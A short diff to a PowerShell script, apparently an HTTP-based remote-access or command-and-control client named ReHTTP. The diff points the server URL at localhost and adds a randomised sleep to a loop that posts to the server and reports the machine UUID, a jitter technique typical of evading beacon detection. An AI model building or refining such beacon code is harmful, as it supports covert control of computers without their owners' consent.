@@ -1,4 +1,4 @@
-$SERVER_URL = "http://localhost:8080/ReHTTP/Server/"
+$SERVER_URL = "http://localhost/ReHTTP/"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
 # start internal function
@@ -84,8 +84,8 @@ while ($true) {
     Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM 
    
     while ($true) {
-      
-        sleep 1
+        $TIMER = Get-Random -SetSeed 100 -Maximum 1200
+        sleep -Milliseconds $TIMER
         $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
         $SYSTEM = @{
             uuid = "$UID"
